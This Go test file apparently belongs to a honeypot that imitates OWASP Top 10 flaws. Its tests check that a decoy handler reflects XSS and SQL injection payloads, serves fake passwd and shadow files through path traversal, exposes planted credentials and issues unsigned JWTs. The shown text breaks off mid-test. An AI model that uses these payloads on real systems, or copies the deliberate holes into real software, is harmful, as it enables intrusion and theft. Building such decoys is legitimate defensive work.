package vuln

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

// helper: perform a GET request and return the recorder.
func doGet(t *testing.T, h *Handler, path string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodGet, path, nil)
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// helper: perform a POST request with form values and return the recorder.
func doPost(t *testing.T, h *Handler, path string, form url.Values) *httptest.ResponseRecorder {
	t.Helper()
	body := form.Encode()
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	rec := httptest.NewRecorder()
	h.ServeHTTP(rec, req)
	return rec
}

// ---------------------------------------------------------------------------
// NewHandler
// ---------------------------------------------------------------------------

func TestNewHandler(t *testing.T) {
	h := NewHandler()
	if h == nil {
		t.Fatal("NewHandler returned nil")
	}
	if len(h.firstNames) == 0 {
		t.Error("firstNames slice is empty")
	}
	if len(h.lastNames) == 0 {
		t.Error("lastNames slice is empty")
	}
	if len(h.domains) == 0 {
		t.Error("domains slice is empty")
	}
}

// ---------------------------------------------------------------------------
// ShouldHandle
// ---------------------------------------------------------------------------

func TestShouldHandle_VulnPaths(t *testing.T) {
	h := NewHandler()
	paths := []string{
		"/vuln/a01/", "/vuln/a02/", "/vuln/a03/", "/vuln/a04/",
		"/vuln/a05/", "/vuln/a06/", "/vuln/a07/", "/vuln/a08/",
		"/vuln/a09/", "/vuln/a10/",
		"/vuln/a01/admin-panel", "/vuln/a03/search?q=test",
		"/vuln/", "/vuln/unknown",
	}
	for _, p := range paths {
		if !h.ShouldHandle(p) {
			t.Errorf("ShouldHandle(%q) = false, want true", p)
		}
	}
}

func TestShouldHandle_OverlapPaths(t *testing.T) {
	h := NewHandler()
	overlap := []string{"/admin/users", "/logs/access.log", "/proxy"}
	for _, p := range overlap {
		if !h.ShouldHandle(p) {
			t.Errorf("ShouldHandle(%q) = false, want true", p)
		}
	}
}

func TestShouldHandle_UnrelatedPaths(t *testing.T) {
	h := NewHandler()
	paths := []string{"/", "/about", "/api/v1/users", "/contact", "/login", "/dashboard", "/static/app.js"}
	for _, p := range paths {
		if h.ShouldHandle(p) {
			t.Errorf("ShouldHandle(%q) = true, want false", p)
		}
	}
}

// ---------------------------------------------------------------------------
// X-Glitch-Honeypot header (all responses)
// ---------------------------------------------------------------------------

func TestHoneypotHeader_AllResponses(t *testing.T) {
	h := NewHandler()
	paths := []string{
		"/vuln/", "/vuln/a01/", "/vuln/a02/", "/vuln/a03/",
		"/vuln/a04/", "/vuln/a05/", "/vuln/a06/", "/vuln/a07/",
		"/vuln/a08/", "/vuln/a09/", "/vuln/a10/",
		"/admin/users", "/logs/access.log", "/proxy",
	}
	for _, p := range paths {
		rec := doGet(t, h, p)
		got := rec.Header().Get("X-Glitch-Honeypot")
		if got != "true" {
			t.Errorf("path %q: X-Glitch-Honeypot = %q, want %q", p, got, "true")
		}
	}
}

// ---------------------------------------------------------------------------
// X-Glitch-Vuln header per category
// ---------------------------------------------------------------------------

func TestVulnHeader_PerCategory(t *testing.T) {
	h := NewHandler()
	cases := []struct {
		path string
		want string
	}{
		{"/vuln/a01/", "A01"},
		{"/vuln/a01/admin-panel", "A01"},
		{"/vuln/a02/", "A02"},
		{"/vuln/a02/export", "A02"},
		{"/vuln/a03/", "A03"},
		{"/vuln/a03/search?q=hello", "A03"},
		{"/vuln/a04/", "A04"},
		{"/vuln/a04/reset?email=a@b.com", "A04"},
		{"/vuln/a05/", "A05"},
		{"/vuln/a05/error", "A05"},
		{"/vuln/a06/", "A06"},
		{"/vuln/a06/versions", "A06"},
		{"/vuln/a07/", "A07"},
		{"/vuln/a07/login?session=x", "A07"},
		{"/vuln/a08/", "A08"},
		{"/vuln/a08/token", "A08"},
		{"/vuln/a09/", "A09"},
		{"/vuln/a09/logs", "A09"},
		{"/vuln/a10/", "A10"},
		{"/vuln/a10/fetch?url=http://example.com", "A10"},
	}
	for _, tc := range cases {
		rec := doGet(t, h, tc.path)
		got := rec.Header().Get("X-Glitch-Vuln")
		if got != tc.want {
			t.Errorf("path %q: X-Glitch-Vuln = %q, want %q", tc.path, got, tc.want)
		}
	}
}

// ---------------------------------------------------------------------------
// Index page
// ---------------------------------------------------------------------------

func TestIndex_ReturnsHTML(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/")
	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/html") {
		t.Errorf("Content-Type = %q, want text/html", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "OWASP Top 10") {
		t.Error("index page missing 'OWASP Top 10' text")
	}
	// All 10 categories should be linked
	for i := 1; i <= 10; i++ {
		link := strings.ToLower(strings.TrimLeft(strings.Replace(
			strings.Replace("/vuln/a0"+string(rune('0'+i))+"/", "a010", "a10", 1),
			"a00", "a0", 1), ""))
		_ = link
	}
	for _, cat := range []string{"a01", "a02", "a03", "a04", "a05", "a06", "a07", "a08", "a09", "a10"} {
		if !strings.Contains(body, "/vuln/"+cat+"/") {
			t.Errorf("index page missing link to /vuln/%s/", cat)
		}
	}
}

func TestIndex_NoTrailingSlash(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln")
	if rec.Code != http.StatusOK {
		t.Errorf("/vuln status = %d, want %d", rec.Code, http.StatusOK)
	}
}

// ---------------------------------------------------------------------------
// Overview pages return HTML
// ---------------------------------------------------------------------------

func TestOverviewPages_ReturnHTML(t *testing.T) {
	h := NewHandler()
	paths := []string{
		"/vuln/a01/", "/vuln/a02/", "/vuln/a03/", "/vuln/a04/",
		"/vuln/a05/", "/vuln/a06/", "/vuln/a07/", "/vuln/a08/",
		"/vuln/a09/", "/vuln/a10/",
	}
	for _, p := range paths {
		rec := doGet(t, h, p)
		if rec.Code != http.StatusOK {
			t.Errorf("path %q: status = %d, want %d", p, rec.Code, http.StatusOK)
		}
		ct := rec.Header().Get("Content-Type")
		if !strings.Contains(ct, "text/html") {
			t.Errorf("path %q: Content-Type = %q, want text/html", p, ct)
		}
		body := rec.Body.String()
		if !strings.Contains(body, "<html") {
			t.Errorf("path %q: response missing <html tag", p)
		}
	}
}

// ---------------------------------------------------------------------------
// A01: Broken Access Control
// ---------------------------------------------------------------------------

func TestA01_AdminPanel(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/admin-panel")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Admin Panel") {
		t.Error("missing 'Admin Panel' heading")
	}
	if !strings.Contains(body, "without authentication") {
		t.Error("missing authentication warning text")
	}
	// Should contain user table rows
	if !strings.Contains(body, "<table") {
		t.Error("missing user table")
	}
	if !strings.Contains(body, "Password Hash") {
		t.Error("admin panel should have Password Hash column header")
	}
	if !strings.Contains(body, "$2a$") {
		t.Error("admin panel should expose password hashes")
	}
}

func TestA01_AdminPanel_Deterministic(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a01/admin-panel").Body.String()
	body2 := doGet(t, h, "/vuln/a01/admin-panel").Body.String()
	if body1 != body2 {
		t.Error("admin panel responses are not deterministic")
	}
}

func TestA01_IDOR_Users(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/users/1")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	for _, field := range []string{"ssn", "credit_card", "api_key", "internal_notes"} {
		if !strings.Contains(body, field) {
			t.Errorf("user response missing sensitive field %q", field)
		}
	}
}

func TestA01_IDOR_DifferentIDs(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a01/users/1").Body.String()
	body42 := doGet(t, h, "/vuln/a01/users/42").Body.String()
	if body1 == body42 {
		t.Error("different user IDs returned identical responses")
	}
}

func TestA01_Traversal_Passwd(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/traversal?file=../../etc/passwd")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/plain") {
		t.Errorf("Content-Type = %q, want text/plain", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "root:x:0:0") {
		t.Error("passwd traversal missing root entry")
	}
	if !strings.Contains(body, "glitchapp:x:1000") {
		t.Error("passwd traversal missing glitchapp user")
	}
}

func TestA01_Traversal_Shadow(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/traversal?file=../../etc/shadow")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "$6$rounds=") {
		t.Error("shadow file missing hash rounds")
	}
}

func TestA01_Traversal_GenericFile(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/traversal?file=/etc/hostname")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "Configuration line") {
		t.Error("generic traversal missing config lines")
	}
}

func TestA01_Traversal_DefaultFile(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a01/traversal")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	// Default is ../../etc/passwd, so should contain root
	body := rec.Body.String()
	if !strings.Contains(body, "root:x:0:0") {
		t.Error("default traversal should return passwd contents")
	}
}

func TestA01_OverlapPath_AdminUsers(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/admin/users")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	if rec.Header().Get("X-Glitch-Vuln") != "A01" {
		t.Error("/admin/users should set X-Glitch-Vuln to A01")
	}
}

// ---------------------------------------------------------------------------
// A02: Cryptographic Failures
// ---------------------------------------------------------------------------

func TestA02_Export_ContainsPlaintextPasswords(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a02/export")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	for _, keyword := range []string{"password_plaintext", "password_base64", "api_key", "encryption_key", "db_connection"} {
		if !strings.Contains(body, keyword) {
			t.Errorf("export response missing %q", keyword)
		}
	}
}

func TestA02_Config_PlaintextPasswords(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a02/config")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/plain") {
		t.Errorf("Content-Type = %q, want text/plain", ct)
	}
	body := rec.Body.String()
	for _, keyword := range []string{"password", "secret_access_key", "jwt", "admin123", "stripe_secret"} {
		if !strings.Contains(body, keyword) {
			t.Errorf("config response missing keyword %q", keyword)
		}
	}
}

func TestA02_InsecureCookies(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a02/")
	cookies := rec.Result().Cookies()
	found := map[string]bool{"session_id": false, "user_token": false}
	for _, c := range cookies {
		if _, ok := found[c.Name]; ok {
			found[c.Name] = true
			if c.Secure {
				t.Errorf("cookie %q should NOT have Secure flag set (demonstrating insecure cookies)", c.Name)
			}
			if c.HttpOnly {
				t.Errorf("cookie %q should NOT have HttpOnly flag set (demonstrating insecure cookies)", c.Name)
			}
		}
	}
	for name, wasFound := range found {
		if !wasFound {
			t.Errorf("expected cookie %q not found in A02 response", name)
		}
	}
}

// ---------------------------------------------------------------------------
// A03: Injection
// ---------------------------------------------------------------------------

func TestA03_Search_XSSReflection(t *testing.T) {
	h := NewHandler()
	payload := "<script>alert('xss')</script>"
	rec := doGet(t, h, "/vuln/a03/search?q="+url.QueryEscape(payload))
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	// The query should be reflected unsanitized
	if !strings.Contains(body, payload) {
		t.Error("XSS payload not reflected in search response")
	}
}

func TestA03_Search_DefaultQuery(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a03/search")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "example") {
		t.Error("search without query should default to 'example'")
	}
}

func TestA03_Login_GET_ShowsForm(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a03/login")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "<form") {
		t.Error("GET login should show a form")
	}
}

func TestA03_Login_POST_SQLError(t *testing.T) {
	h := NewHandler()
	form := url.Values{"username": {"admin' OR '1'='1"}, "password": {"test"}}
	rec := doPost(t, h, "/vuln/a03/login", form)
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusInternalServerError)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "DatabaseError") {
		t.Error("SQL error response missing 'DatabaseError'")
	}
	if !strings.Contains(body, "SELECT * FROM users") {
		t.Error("SQL error response missing query fragment")
	}
	// The username should be reflected in the SQL error
	if !strings.Contains(body, "admin' OR '1'='1") {
		t.Error("username not reflected in SQL error message")
	}
}

func TestA03_Login_POST_DefaultUsername(t *testing.T) {
	h := NewHandler()
	form := url.Values{"password": {"test"}}
	rec := doPost(t, h, "/vuln/a03/login", form)
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusInternalServerError)
	}
	body := rec.Body.String()
	// Should default to "admin" username
	if !strings.Contains(body, "admin") {
		t.Error("POST without username should default to 'admin'")
	}
}

func TestA03_Users_NormalQuery(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a03/users?id=1")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, `"result_count":1`) {
		t.Error("normal query should return exactly 1 user")
	}
	if !strings.Contains(body, "SELECT * FROM users") {
		t.Error("response should include the raw SQL query")
	}
}

func TestA03_Users_SQLInjection(t *testing.T) {
	h := NewHandler()
	injections := []string{
		"1 OR 1=1",
		"1 or 1=1",
		"1; DROP TABLE users--",
		"1 UNION SELECT * FROM passwords",
	}
	for _, inj := range injections {
		rec := doGet(t, h, "/vuln/a03/users?id="+url.QueryEscape(inj))
		if rec.Code != http.StatusOK {
			t.Fatalf("id=%q: status = %d, want %d", inj, rec.Code, http.StatusOK)
		}
		body := rec.Body.String()
		if !strings.Contains(body, `"result_count":50`) {
			t.Errorf("id=%q: expected 50 leaked results for SQLi payload", inj)
		}
		if !strings.Contains(body, "debug") {
			t.Errorf("id=%q: expected debug warning for SQLi payload", inj)
		}
	}
}

// ---------------------------------------------------------------------------
// A04: Insecure Design
// ---------------------------------------------------------------------------

func TestA04_Reset_PredictableToken(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a04/reset?email=user@example.com")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "reset_token") {
		t.Error("response missing reset_token")
	}
	if !strings.Contains(body, "token_algorithm") {
		t.Error("response missing debug token_algorithm info")
	}
	if !strings.Contains(body, "sequential_counter") {
		t.Error("response missing sequential_counter algorithm detail")
	}
}

func TestA04_Reset_DeterministicToken(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a04/reset?email=test@example.com").Body.String()
	body2 := doGet(t, h, "/vuln/a04/reset?email=test@example.com").Body.String()
	// The response includes a timestamp, so compare the token portion only.
	// Extract reset_token values -- they are 4-digit strings like "5231"
	extractToken := func(body string) string {
		idx := strings.Index(body, "reset_token")
		if idx < 0 {
			return ""
		}
		end := idx + 50
		if end > len(body) {
			end = len(body)
		}
		sub := body[idx:end]
		// The format is "reset_token":"NNNN"
		start := strings.Index(sub, ":\"")
		if start < 0 {
			return ""
		}
		qEnd := strings.Index(sub[start+2:], "\"")
		if qEnd < 0 {
			return ""
		}
		return sub[start+2 : start+2+qEnd]
	}
	t1 := extractToken(body1)
	t2 := extractToken(body2)
	if t1 == "" || t2 == "" {
		t.Fatal("could not extract reset_token from response")
	}
	if t1 != t2 {
		t.Errorf("same email produced different tokens: %q vs %q", t1, t2)
	}
}

func TestA04_Reset_DifferentEmails(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a04/reset?email=alice@example.com").Body.String()
	body2 := doGet(t, h, "/vuln/a04/reset?email=bob@example.com").Body.String()
	if body1 == body2 {
		t.Error("different emails should produce different reset tokens")
	}
}

func TestA04_Verify_AcceptsShortTokens(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a04/verify?token=0001")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, `"valid":true`) {
		t.Error("4-digit token should be accepted as valid")
	}
	if !strings.Contains(body, "TempPass123!") {
		t.Error("response should contain the new password")
	}
}

func TestA04_Verify_RejectsLongTokens(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a04/verify?token=12345")
	body := rec.Body.String()
	if !strings.Contains(body, `"valid":false`) {
		t.Error("token longer than 4 chars should be invalid")
	}
}

func TestA04_Users_SequentialIDs(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a04/users")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	// Should contain sequential account numbers
	if !strings.Contains(body, "ACC-00001") {
		t.Error("users should have sequential account numbers starting with ACC-00001")
	}
	if !strings.Contains(body, "key_0001") {
		t.Error("users should have sequential API keys starting with key_0001")
	}
	if !strings.Contains(body, "sequential") {
		t.Error("response should note that IDs use sequential numbering")
	}
}

// ---------------------------------------------------------------------------
// A05: Security Misconfiguration
// ---------------------------------------------------------------------------

func TestA05_VerboseHeaders(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a05/")
	headers := map[string]string{
		"X-Powered-By":    "PHP/7.4.3",
		"Server":          "Apache/2.4.41 (Ubuntu)",
		"X-AspNet-Version": "4.0.30319",
		"X-Runtime":       "0.042359",
	}
	for name, expected := range headers {
		got := rec.Header().Get(name)
		if got != expected {
			t.Errorf("header %q = %q, want %q", name, got, expected)
		}
	}
	debugInfo := rec.Header().Get("X-Debug-Info")
	if !strings.Contains(debugInfo, "debug=true") {
		t.Error("X-Debug-Info header missing debug=true")
	}
}

func TestA05_Error_StackTrace(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a05/error")
	if rec.Code != http.StatusInternalServerError {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusInternalServerError)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "goroutine") {
		t.Error("error page missing stack trace (goroutine)")
	}
	if !strings.Contains(body, "DATABASE_URL") {
		t.Error("error page missing exposed environment variables")
	}
	if !strings.Contains(body, "AWS_ACCESS_KEY_ID") {
		t.Error("error page missing AWS credentials in env vars")
	}
}

func TestA05_PhpInfo(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a05/phpinfo")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/html") {
		t.Errorf("Content-Type = %q, want text/html", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "phpinfo()") {
		t.Error("phpinfo page missing phpinfo() title")
	}
	if !strings.Contains(body, "PHP Version 5.6.40") {
		t.Error("phpinfo page missing PHP version")
	}
	if !strings.Contains(body, "DB_PASSWORD") {
		t.Error("phpinfo page missing exposed DB_PASSWORD")
	}
}

func TestA05_Config_DefaultCredentials(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a05/config")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "default_accounts") {
		t.Error("config should expose default accounts")
	}
	if !strings.Contains(body, `"debug":true`) {
		t.Error("config should have debug enabled")
	}
}

// ---------------------------------------------------------------------------
// A06: Vulnerable and Outdated Components
// ---------------------------------------------------------------------------

func TestA06_Overview_OutdatedHeaders(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a06/")
	if rec.Header().Get("Server") != "Apache/2.4.29" {
		t.Errorf("Server header = %q, want Apache/2.4.29", rec.Header().Get("Server"))
	}
	if rec.Header().Get("X-Powered-By") != "PHP/5.6.0" {
		t.Errorf("X-Powered-By header = %q, want PHP/5.6.0", rec.Header().Get("X-Powered-By"))
	}
}

func TestA06_Versions_ContainsCVEs(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a06/versions")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "CVE-") {
		t.Error("versions response missing CVE identifiers")
	}
	// Should contain Log4j CVE
	if !strings.Contains(body, "CVE-2021-44228") {
		t.Error("versions response missing Log4Shell CVE-2021-44228")
	}
	if !strings.Contains(body, "critical") {
		t.Error("versions response missing severity ratings")
	}
	if !strings.Contains(body, "components") {
		t.Error("versions response missing components key")
	}
}

// ---------------------------------------------------------------------------
// A07: Identification and Authentication Failures
// ---------------------------------------------------------------------------

func TestA07_SessionInURL(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a07/login?session=mysecrettoken")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "mysecrettoken") {
		t.Error("session token not reflected in login page")
	}
	if !strings.Contains(body, "Session token visible in URL") {
		t.Error("missing session-in-URL security warning")
	}
}

func TestA07_PredictableSessionCookies(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a07/")
	cookies := rec.Result().Cookies()
	found := map[string]bool{"auth_session": false, "remember_me": false}
	for _, c := range cookies {
		if _, ok := found[c.Name]; ok {
			found[c.Name] = true
		}
	}
	for name, wasFound := range found {
		if !wasFound {
			t.Errorf("expected cookie %q not found in A07 response", name)
		}
	}
}

func TestA07_Dashboard_PredictableSID(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a07/dashboard?sid=sess_0001")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "sess_0001") {
		t.Error("session ID not reflected in dashboard")
	}
	if !strings.Contains(body, "predictable") {
		t.Error("dashboard missing predictable session ID warning")
	}
}

func TestA07_Dashboard_DifferentSIDs(t *testing.T) {
	h := NewHandler()
	body1 := doGet(t, h, "/vuln/a07/dashboard?sid=sess_0001").Body.String()
	body2 := doGet(t, h, "/vuln/a07/dashboard?sid=sess_0002").Body.String()
	if body1 == body2 {
		t.Error("different session IDs should produce different dashboard content")
	}
}

// ---------------------------------------------------------------------------
// A08: Software and Data Integrity Failures
// ---------------------------------------------------------------------------

func TestA08_Token_UnsignedJWT(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a08/token")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "token") {
		t.Error("JWT response missing 'token' field")
	}
	if !strings.Contains(body, `"algorithm":"none"`) {
		t.Error("JWT should use alg:none")
	}
	if !strings.Contains(body, "superadmin") {
		t.Error("JWT should contain superadmin role")
	}
	// The token itself should be a valid base64.base64. structure
	if !strings.Contains(body, "eyJ") {
		t.Error("JWT token should start with base64-encoded header (eyJ)")
	}
}

func TestA08_Deserialize_DefaultPayload(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a08/deserialize")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "deserialized") {
		t.Error("response missing 'deserialized' status")
	}
	if !strings.Contains(body, "os.execute") {
		t.Error("default deserialization payload should contain os.execute command")
	}
}

func TestA08_Deserialize_CustomPayload(t *testing.T) {
	h := NewHandler()
	// Provide a custom base64 payload
	rec := doGet(t, h, "/vuln/a08/deserialize?payload=dGVzdA==")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "test") {
		t.Error("custom payload 'test' not decoded in response")
	}
}

func TestA08_Deserialize_InvalidBase64(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a08/deserialize?payload=!!!invalid!!!")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "failed to decode") {
		t.Error("invalid base64 should report decode failure")
	}
}

func TestA08_Update_NoSignatureVerification(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a08/update")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "signature") {
		t.Error("update response missing signature field")
	}
	if !strings.Contains(body, "not_verified") {
		t.Error("update should indicate signature not verified")
	}
	if !strings.Contains(body, "integrity_check") {
		t.Error("update response missing integrity_check field")
	}
}

// ---------------------------------------------------------------------------
// A09: Security Logging and Monitoring Failures
// ---------------------------------------------------------------------------

func TestA09_AccessLog(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a09/logs")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/plain") {
		t.Errorf("Content-Type = %q, want text/plain", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "HTTP/1.1") {
		t.Error("access log missing HTTP/1.1 entries")
	}
	// Should have ~200 lines
	lines := strings.Count(body, "\n")
	if lines < 100 {
		t.Errorf("access log has only %d lines, expected ~200", lines)
	}
}

func TestA09_ErrorLog(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a09/errors")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/plain") {
		t.Errorf("Content-Type = %q, want text/plain", ct)
	}
	body := rec.Body.String()
	// Should contain error severity levels
	hasLevel := strings.Contains(body, "ERROR") || strings.Contains(body, "FATAL") ||
		strings.Contains(body, "CRITICAL") || strings.Contains(body, "WARNING")
	if !hasLevel {
		t.Error("error log missing severity levels")
	}
	// Should contain sensitive data (connection strings, paths, etc.)
	if !strings.Contains(body, "postgres://") && !strings.Contains(body, "database connection") {
		t.Error("error log missing sensitive database connection details")
	}
}

func TestA09_AuditLog(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/vuln/a09/audit")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "application/json") {
		t.Errorf("Content-Type = %q, want application/json", ct)
	}
	body := rec.Body.String()
	if !strings.Contains(body, "audit_log") {
		t.Error("audit log response missing 'audit_log' key")
	}
	if !strings.Contains(body, "without authentication") {
		t.Error("audit log should warn about being accessible without authentication")
	}
}

func TestA09_OverlapPath_LogsAccessLog(t *testing.T) {
	h := NewHandler()
	rec := doGet(t, h, "/logs/access.log")
	if rec.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", rec.Code, http.StatusOK)
	}
	ct := rec.Header().Get("Content-Type")
	if !strings.Contains(ct, "text/plain") {
